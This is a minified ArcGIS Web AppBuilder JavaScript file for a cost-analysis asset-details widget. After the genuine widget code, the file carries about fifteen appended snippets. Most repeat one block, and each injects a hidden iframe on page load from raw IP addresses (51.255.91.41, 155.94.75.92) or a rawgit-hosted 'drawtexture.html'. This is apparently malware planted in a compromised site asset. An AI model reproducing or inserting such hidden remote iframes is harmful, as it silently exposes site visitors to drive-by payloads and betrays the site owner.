// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.

require({cache:{"url:widgets/CostAnalysis/asset-details.html":'\x3cdiv style\x3d"height: 100%; width: 100%"\x3e\r\n  \x3cdiv style\x3d"height: 100%; width: 100%" data-dojo-attach-point\x3d"assetDetailsParent"\x3e\r\n    \x3cdiv class\x3d"esriCTContentSection"\x3e\r\n      \x3cdiv class\x3d"esriCTAssetDetailsTitle"\x3e\r\n        ${nls.workBench.assetDetailsTitle}\r\n      \x3c/div\x3e\r\n      \x3cdiv style\x3d"padding: 10px 0; text-align : center; font-weight : bold;" data-dojo-attach-point\x3d"noAssetDetails"\x3e\r\n        ${nls.workBench.noAssetAddedMsg}\r\n      \x3c/div\x3e\r\n      \x3cdiv data-dojo-attach-point\x3d"assetDetailsNode"\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"listNode"\x3e\x3c/div\x3e\r\n        \x3cdiv\x3e\r\n          \x3cdiv\x3e\r\n            \x3cdiv class\x3d"esriCTTotalCostTitle" title\x3d"${nls.assetDetails.totalCostTitle}"\x3e${nls.assetDetails.totalCostTitle}\x3c/div\x3e\r\n            \x3cdiv style\x3d"height: 30px;" class\x3d"esriCTEditEquationIcon" data-dojo-attach-point\x3d"additionalCostBtn"\x3e\x3c/div\x3e\r\n          \x3c/div\x3e\r\n          \x3cdiv data-dojo-attach-point\x3d"totalProjectCost"\x3e\r\n            \x3ctable class\x3d"esriCTTable" style\x3d"width: 100%;"\x3e\r\n              \x3ctbody\x3e\r\n                \x3ctr\x3e\r\n                  \x3ctd class\x3d"esriCTBoldFont esriCTAssetDetailsTotalCostLabel" data-dojo-attach-point\x3d"totalCostLabel"\x3e${nls.projectOverview.totalCostLabel}\x3c/td\x3e\r\n                  \x3ctd class\x3d"esriCTBoldFont esriCTAssetDetailsTotalCost" data-dojo-attach-point\x3d"totalCost"\x3e\x3c/td\x3e\r\n                \x3c/tr\x3e\r\n              \x3c/tbody\x3e\r\n            \x3c/table\x3e\r\n            \x3ctable class\x3d"esriCTTable" style\x3d"width: 100%;"\x3e\r\n              \x3ctbody data-dojo-attach-point\x3d"additionalCostTable"\x3e\r\n              \x3c/tbody\x3e\r\n            \x3c/table\x3e\r\n            \x3ctable class\x3d"esriCTTable" style\x3d"width: 100%;"\x3e\r\n              \x3ctbody\x3e\r\n                \x3ctr\x3e\r\n                  \x3ctd class\x3d"esriCTBoldFont esriCTAssetDetailsGrossCostLabel" data-dojo-attach-point\x3d"grossCostLabel"\x3e${nls.projectOverview.grossCostLabel}\x3c/td\x3e\r\n                  \x3ctd class\x3d"esriCTBoldFont esriCTAssetDetailsGrossCost" data-dojo-attach-point\x3d"grossCost"\x3e\x3c/td\x3e\r\n                \x3c/tr\x3e\r\n                \x3ctr\x3e\r\n                  \x3ctd style\x3d"font-weight: normal; font-style: italic;" colspan\x3d"2" data-dojo-attach-point\x3d"roundingLabel"\x3e${nls.projectOverview.roundingLabel}\x3c/td\x3e\r\n                \x3c/tr\x3e\r\n              \x3c/tbody\x3e\r\n            \x3c/table\x3e\r\n          \x3c/div\x3e\r\n        \x3c/div\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv class\x3d"esriCTPageFooter"\x3e\r\n      \x3cdiv class\x3d"jimu-btn esriCTEllipsis" data-dojo-attach-point\x3d"okButton"\x3e${nls.common.back}\x3c/div\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv style\x3d"height: 100%; width: 100%" class\x3d"esriCTHidden" data-dojo-attach-point\x3d"costEquationEditorParent"\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare dojo/_base/html jimu/BaseWidget dojo/Evented dijit/_WidgetsInTemplateMixin dojo/text!./asset-details.html dojo/_base/lang dojo/dom-construct dojo/_base/array dojo/dom-class dojo/dom-attr dojo/string dojo/on dojo/query dijit/TooltipDialog dijit/popup esri/graphicsUtils ./advance-item-list ./cost-equation-editor".split(" "),function(y,z,A,B,C,D,f,c,n,k,d,w,g,v,E,x,F,G,H){return y([A,B,C],{templateString:D,baseClass:"jimu-widget-cost-analysis-asset-details",_layerDetailsNode:{},
_layerIndexes:[],_openGroups:{},postCreate:function(){this.inherited(arguments);this._layerDetailsNode={};this._openGroups={};this.listData=[];this._layerIndexes=[];n.forEach(this.config.layerSettings,f.hitch(this,function(a){if(a.editable&&this.map.getLayer(a.id)){var b;this._openGroups[a.id]=[];this._layerDetailsNode[a.id]=c.create("div");b={title:this.map.getLayer(a.id).name,content:this._layerDetailsNode[a.id],icon:"",actionIcon:"",isOpen:!1,isHidden:!0};this.listData.push(b);this._layerIndexes.push(a.id)}}))},
startup:function(){this.inherited(arguments);this._initItemList();this._initCostEquationEditor();this.own(g(document.body,"click",f.hitch(this,function(a){this.isPartOfPopup(a.target||a.srcElement)||this._closePopupDialog()})));this.own(g(this.okButton,"click",f.hitch(this,function(){this.emit("onOkButtonClicked")})));this.own(g(this.additionalCostBtn,"click",f.hitch(this,function(){this.emit("showAdditionalCost")})))},reset:function(){for(var a in this._openGroups)this._openGroups[a]=[]},_initItemList:function(){var a;
this.itemList=new G({itemList:this.listData,showArrow:!0,togglePanels:!0,openMultiple:!0,setAutoHeight:!0,highlighter:!0,highlighterColor:this.config.selectedThemeColor},c.create("div",{},this.listNode));this.own(g(this.itemList,"onActionButtonClicked",f.hitch(this,function(a){this.emit("actionClicked",a)})));this.own(g(this.itemList,"onTitleClicked",f.hitch(this,function(a){this.emit("titleClicked",a)})));this.own(g(this.itemList,"onLoad",f.hitch(this,function(){this.emit("onLoad")})));this.itemList.startup();
a=this._createTooltipDialogContent();this.assetDetailsDialog=new E({"class":this.baseClass,content:a,style:"width : 180px"})},_createTooltipDialogContent:function(){var a,b,h;a=c.create("div",{},null);b=c.create("div",{style:"height : 20px; margin: 0px"},a);b=c.create("div",{"class":"esriCTDialogIcon esriCTClose",title:this.nls.workBench.closeDialog},b);this.own(g(b,"click",f.hitch(this,this._closePopupDialog)));b=c.create("div",{"class":"esriCTRowContainer",title:this.nls.workBench.zoomToAsset},
a);h=c.create("div",{"class":"esriCTRowContainer",title:this.nls.workBench.deleteAsset},a);c.create("div",{"class":"esriCTDialogIcon esriCTZoom"},b);c.create("div",{"class":"esriCTTooltipDialogLabel esriCTEllipsis",innerHTML:this.nls.workBench.zoomToAsset},b);this.own(g(b,"click",f.hitch(this,this._zoomToAsset)));c.create("div",{"class":"esriCTDialogIcon esriCTDelete"},h);c.create("div",{"class":"esriCTTooltipDialogLabel",innerHTML:this.nls.workBench.deleteAsset},h);this.own(g(h,"click",f.hitch(this,
this._deleteAsset)));return a},_zoomToAsset:function(){var a,b;this.selectedRowInfo&&(a=this.assetDetails[this.selectedRowInfo.layerId][this.selectedRowInfo.templateName][this.selectedRowInfo.region][this.selectedRowInfo.scenario],b=this.layerInfosObj.getLayerInfoById(this.selectedRowInfo.layerId).layerObject.objectIdField,a&&n.some(a,f.hitch(this,function(a){if(a.attributes[b].toString()===this.selectedRowInfo.objectId)return this.map.setExtent(F.graphicsExtent([a]).expand(1.5)),!0})))},_deleteAsset:function(){if(this.selectedRowInfo){var a,
b;a=this.map.getLayer(this.selectedRowInfo.layerId);(b=this.assetDetails[this.selectedRowInfo.layerId][this.selectedRowInfo.templateName][this.selectedRowInfo.region][this.selectedRowInfo.scenario])&&n.some(b,f.hitch(this,function(b){if(b.attributes[a.objectIdField].toString()===this.selectedRowInfo.objectId)return b._layer=a,a.applyEdits(null,null,[b]),!0}));this._closePopupDialog()}},_rowClick:function(a){a.stopPropagation();a.preventDefault();v(".esriCTRowSelected",this.assetDetailsNode).removeClass("esriCTRowSelected");
k.add(a.currentTarget,"esriCTRowSelected");this.selectedRowInfo={};this.selectedRowInfo.templateName=d.get(a.currentTarget,"templateName");this.selectedRowInfo.region=d.get(a.currentTarget,"region");this.selectedRowInfo.scenario=d.get(a.currentTarget,"scenario");this.selectedRowInfo.layerId=d.get(a.currentTarget,"layerId");this.selectedRowInfo.objectId=d.get(a.currentTarget,"objectId");this._openPopupDialog(this.assetDetailsDialog,a)},_createExpandCollapseButton:function(a,b,h){a=c.create("div",{"class":"esriCTToggleIcon"},
a);-1===this._openGroups[h].indexOf(b)?k.add(a,"esriCTExpandIcon"):k.add(a,"esriCTCollapseIcon");d.set(a,"groupId",b);d.set(a,"layerId",h);this.own(g(a,"click",f.hitch(this,function(a){var b,c,h;b=d.get(a.currentTarget,"groupId");c=d.get(a.currentTarget,"layerId");h=v("[tableGroupId \x3d "+b.replace(/"/g,'\\"')+"]",this.assetDetailsNode)[0];k.contains(a.currentTarget,"esriCTCollapseIcon")?(k.replace(a.currentTarget,"esriCTExpandIcon","esriCTCollapseIcon"),k.add(h,"esriCTHidden"),this._openGroups[c].splice(this._openGroups[c].indexOf(b),
1)):(k.replace(a.currentTarget,"esriCTCollapseIcon","esriCTExpandIcon"),k.remove(h,"esriCTHidden"),this._openGroups[c].push(b))})));return a},_createEditEquationButton:function(a,b){a=c.create("div",{"class":"esriCTEditEquationIcon"},a);d.set(a,"templateName",b.templateName);d.set(a,"region",b.regionName);d.set(a,"scenario",b.scenario);d.set(a,"layerId",b.layerId);d.set(a,"equation",b.equation);this.own(g(a,"click",f.hitch(this,function(a){var b={};b.templateName=d.get(a.currentTarget,"templateName");
b.region=d.get(a.currentTarget,"region");b.scenario=d.get(a.currentTarget,"scenario");b.layerId=d.get(a.currentTarget,"layerId");b.equation=d.get(a.currentTarget,"equation");k.add(this.assetDetailsParent,"esriCTHidden");k.remove(this.costEquationEditorParent,"esriCTHidden");this._costEquationEditor&&this._costEquationEditor.setGroupInfo(b)})));return a},_createAssetDetailsTable:function(a,b,h,r){var e,q,t,l=0,p=0,m;m=this.layerInfosObj.getLayerInfoById(r.layerId).layerObject.objectIdField;e=c.create("table",
{style:{width:"100%"},"class":"esriCTTable"},a);-1===this._openGroups[r.layerId].indexOf(b)&&k.add(e,"esriCTHidden");d.set(e,"tableGroupId",b);q=c.create("tbody",{},e);"point"!==h[0].geometry.type?(t=this.appUtils.getUnitsAbbreviation(h[0].geometry.type,this.config.generalSettings.measurementUnit),e="polygon"===h[0].geometry.type?this.nls.statisticsType.areaLabel:this.nls.statisticsType.lengthLabel):(t=this.nls.workBench.units,e=this.nls.statisticsType.countLabel);b=c.create("tr",{},q);c.create("td",
{innerHTML:this.nls.workBench.objectIdColTitle},b);c.create("td",{innerHTML:e},b);c.create("td",{innerHTML:this.nls.workBench.costColTitle},b);n.forEach(h,f.hitch(this,function(a){var b,e;e=c.create("tr",{"class":"esriCTSelectableRow"},q);b=a.featureDimension;d.set(e,"templateName",r.templateName);d.set(e,"region",r.regionName);d.set(e,"scenario",r.scenario);d.set(e,"layerId",r.layerId);d.set(e,"objectId",a.attributes[m]);this.own(g(e,"click",f.hitch(this,this._rowClick)));"point"!==h[0].geometry.type&&
(b=this.appUtils.applyRounding(b));c.create("td",{innerHTML:a.attributes[m]},e);c.create("td",{innerHTML:b+" "+t},e);b=this.config.generalSettings.currency+" "+this.appUtils.applyRounding(a.individualCost);c.create("td",{innerHTML:b,"class":"esriCTAssetItemDetailsCostingValue"},e);l+=a.individualCost;p+=a.featureDimension}));"point"!==h[0].geometry.type&&(p=this.appUtils.applyRounding(p));a=c.create("table",{style:{width:"100%"},"class":"esriCTTable"},a);a=c.create("tr",{},c.create("tbody",{},a));
c.create("td",{"class":"esriCTGroupSummaryTotalTitle",innerHTML:"Total:"},a);c.create("td",{innerHTML:p+" "+t},a);l=this.config.generalSettings.currency+" "+this.appUtils.applyRounding(l);c.create("td",{innerHTML:l,"class":"esriCTGroupSummaryTotalCost"},a)},showAssetDetails:function(a){var b,h=!1;this.assetDetails=a;for(var d in this._layerDetailsNode)if(b=this._layerIndexes.indexOf(d),c.empty(this._layerDetailsNode[d]),this.itemList.hide(b),a.hasOwnProperty(d))for(var e in a[d])for(var q in a[d][e])for(var g in a[d][e][q]){var l,
p,m,n;l=q;m=g;var u;u=e+" ";p=a[d][e][q][g];0<p.length&&(h={templateName:e,regionName:q,scenario:g,layerId:d,equation:p[0].templateInfo.COSTEQUATION},"null"===l?l=this.nls.scenarioSelection.noneText:u+=w.substitute(this.nls.assetDetails.inGeography,{geography:l}),"null"===m?m=this.nls.scenarioSelection.noneText:u+=w.substitute(this.nls.assetDetails.withScenario,{scenario:m}),l=d+" - "+e+" - "+l+" - "+m,l=f.trim(l),m=c.create("div",{"class":"esriCTGroupSummary"},this._layerDetailsNode[d]),n=c.create("div",
{"class":"esriCTGroupTitleParent"},m),this._createExpandCollapseButton(n,l,d),c.create("div",{"class":"esriCTGroupTitle",innerHTML:u},n),this._createEditEquationButton(n,h),this._createAssetDetailsTable(m,l,p,h),this.itemList.show(b),h=!0)}h?k.add(this.noAssetDetails,"esriCTHidden"):k.remove(this.noAssetDetails,"esriCTHidden")},_openPopupDialog:function(a,b){x.open({popup:a,x:b.pageX,y:b.pageY})},_closePopupDialog:function(){x.close(this.assetDetailsDialog);v(".esriCTRowSelected",this.assetDetailsNode).removeClass("esriCTRowSelected")},
_initCostEquationEditor:function(){this._costEquationEditor||(this._costEquationEditor=new H({nls:this.nls,map:this.map,config:this.config,appUtils:this.appUtils},c.create("div",{},this.costEquationEditorParent)),this.own(g(this._costEquationEditor,"onOkButtonClicked",f.hitch(this,function(a){this.emit("groupCostEquationUpdated",a);k.add(this.costEquationEditorParent,"esriCTHidden");k.remove(this.assetDetailsParent,"esriCTHidden")}))),this.own(g(this._costEquationEditor,"onCancelButtonClicked",f.hitch(this,
function(){k.add(this.costEquationEditorParent,"esriCTHidden");k.remove(this.assetDetailsParent,"esriCTHidden")}))),this._costEquationEditor.startup())},isPartOfPopup:function(a){var b;b=this.assetDetailsDialog.domNode;return a===b||z.isDescendant(a,b)},grossCostUpdated:function(a,b,c){b=this.appUtils.roundProjectCostValue(this.config.generalSettings.roundCostType,b);b=this.config.generalSettings.currency+" "+b;d.set(this.grossCost,"innerHTML",b);this._updateAdditionalCostTable(a,c)},totalCostUpdated:function(a){a=
this.appUtils.roundProjectCostValue(this.config.generalSettings.roundCostType,a);a=this.config.generalSettings.currency+" "+a;d.set(this.totalCost,"innerHTML",a)},_updateAdditionalCostTable:function(a,b){var d;c.empty(this.additionalCostTable);if(0<b.length)for(d=c.create("tr"),d.appendChild(c.create("td",{innerHTML:this.nls.assetDetails.additionalCostLabel})),d.appendChild(c.create("td",{innerHTML:this.nls.assetDetails.additionalCostValue})),d.appendChild(c.create("td",{innerHTML:this.nls.assetDetails.additionalCostNetValue})),
this.additionalCostTable.appendChild(d),d=0;d<b.length;d++){var f,e,g;e=c.create("tr");f=b[d];switch(f.type){case "+":g=a+=f.value;break;case "_":g=a-=f.value;break;case "*":g=a*=f.value}g=this.appUtils.roundProjectCostValue(this.config.generalSettings.roundCostType,g);g=this.config.generalSettings.currency+" "+g;e.appendChild(c.create("td",{innerHTML:f.label}));e.appendChild(c.create("td",{innerHTML:f.value}));e.appendChild(c.create("td",{innerHTML:g,"class":"esriCTAssetItemDetailsNetValue"}));this.additionalCostTable.appendChild(e)}}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});